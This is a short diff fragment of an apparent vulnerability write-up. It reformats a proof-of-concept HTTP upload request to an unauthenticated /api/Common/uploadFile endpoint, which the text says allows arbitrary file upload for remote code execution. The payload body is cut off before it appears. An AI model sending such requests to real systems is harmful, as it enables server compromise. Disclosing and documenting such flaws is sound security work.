@@ -35,22 +35,13 @@ We can upload any file via unauthorised api for RCE purposes.
 POC
 ```
 POST /api/Common/uploadFile HTTP/1.1
-
 Host: 127.0.0.5
-
 User-Agent: python-requests/2.28.1
-
 Accept-Encoding: gzip, deflate
-
 Accept: */*
-
 Connection: keep-alive
-
 Content-Length: 166
-
 Content-Type: multipart/form-data; boundary=5f0c1dda2c37ae232c96415ad53dc96b
-
-  
 
 --5f0c1dda2c37ae232c96415ad53dc96b
 
